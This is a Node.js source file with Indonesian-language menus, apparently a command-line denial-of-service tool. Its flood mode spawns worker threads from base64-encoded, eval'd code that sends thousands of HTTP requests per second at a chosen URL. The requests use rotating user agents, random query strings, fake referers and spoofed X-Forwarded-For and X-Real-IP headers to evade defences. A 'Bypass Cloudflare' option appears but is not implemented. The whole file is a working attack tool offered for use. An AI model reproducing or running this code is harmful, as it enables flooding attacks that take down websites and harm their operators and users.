const readline = require("readline");
const os = require("os");
const https = require("https");
const { Worker } = require("worker_threads");

// Ambil IP publik
function getPublicIP(callback) {
  https.get("https://api.ipify.org?format=json", (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      try {
        const ip = JSON.parse(data).ip;
        callback(ip);
      } catch {
        callback("Tidak diketahui");
      }
    });
  }).on("error", () => {
    callback("Gagal mengambil IP");
  });
}

// Fungsi untuk menjalankan flood via worker remote (GitHub)
function runRemoteWorkers(target, duration, thread = 4) {
  console.log(`[!] Menjalankan ${thread} threads...\n`);
  let total = 0, success = 0, failed = 0;

  const encoded = Buffer.from(`
    const { parentPort, workerData } = require('worker_threads');
    const { URL } = require("url");
    const http = require("http");
    const https = require("https");

    function flood(target, duration) {
      const { request, Agent } = target.startsWith("https") ? https : http;
      const url = new URL(target);
      const agent = new Agent({ keepAlive: true, maxSockets: 99999 });

      const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/16.4 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 Chrome/111.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3) AppleWebKit/605.1.15 CriOS/112.0.5615.46 Mobile Safari/604.1",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/112.0.1722.34 Chrome/111.0.0.0 Safari/537.36"
      ];

      let total = 0;
      let success = 0;
      let failed = 0;

      const randomIP = () => Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join(".");
      const randomQuery = () => "?v=" + Math.random().toString(36).substring(2) + "&t=" + Date.now();

      const attack = () => {
        for (let i = 0; i < 2500; i++) {
          const options = {
            hostname: url.hostname,
            port: url.port || (url.protocol === "https:" ? 443 : 80),
            path: url.pathname + randomQuery(),
            method: "GET",
            headers: {
              "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
              "Referer": "https://google.com/search?q=" + Math.random().toString(36).substring(2),
              "X-Forwarded-For": randomIP(),
              "X-Real-IP": randomIP(),
              "Connection": "keep-alive"
            },
            agent
          };

          const req = request(options, res => {
            total++;
            if (res.statusCode >= 200 && res.statusCode < 400) success++;
            else failed++;
            res.resume();
          });

          req.on("error", () => {
            total++;
            failed++;
          });

          req.end();
        }
      };

      const loop = setInterval(attack, 40);
      const log = setInterval(() => {
        parentPort.postMessage({ total, success, failed });
      }, 1000);

      setTimeout(() => {
        clearInterval(loop);
        clearInterval(log);
        parentPort.postMessage({ done: true, total, success, failed });
      }, duration * 1000);
    }

    flood(workerData.target, workerData.duration);
  `).toString("base64");

  for (let i = 0; i < thread; i++) {
    const worker = new Worker(`
      const { workerData, parentPort } = require('worker_threads');
      eval(Buffer.from("${encoded}", "base64").toString());
    `, {
      eval: true,
      workerData: { target, duration }
    });

    worker.on("message", msg => {
      if (msg.done) {
        console.log(`[✓] Worker selesai | Total=${msg.total} | Sukses=${msg.success} | Gagal=${msg.failed}`);
      } else {
        total += msg.total;
        success += msg.success;
        failed += msg.failed;
      }
    });

    worker.on("error", err => console.error(`[!] Worker error: ${err}`));
  }
}

// Menu utama
function showMenu(ip) {
  const platform = os.platform();
  const deviceType = /android/.test(platform) ? "Android/Termux" : platform;

  console.clear();
  console.log("==============================");
  console.log("     TOOLS JS INFORMATION     ");
  console.log("==============================");
  console.log("IP Address  :", ip);
  console.log("Device      :", deviceType);
  console.log("==============================");
  console.log("1. Mode Flood");
  console.log("2. Bypass Cloudflare");
  console.log("3. Bot Flood");
  console.log("0. Exit");
  console.log("==============================");

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question("Pilih mode: ", (input) => {
    switch (input) {
      case '1':
        rl.question("Target URL: ", (url) => {
          rl.question("Durasi (detik): ", (time) => {
            runRemoteWorkers(url, parseInt(time), 4);
            rl.close();
          });
        });
        break;

      case '2':
        console.log("Mode CF Bypass belum tersedia.");
        rl.close();
        break;

      case '3':
        console.log("Mode Bot Flood belum tersedia.");
        rl.close();
        break;

      case '0':
        console.log("Keluar...");
        rl.close();
        break;

      default:
        console.log("Pilihan tidak valid.");
        rl.close();
    }
  });
}

// Jalankan
getPublicIP((ip) => {
  showMenu(ip);
});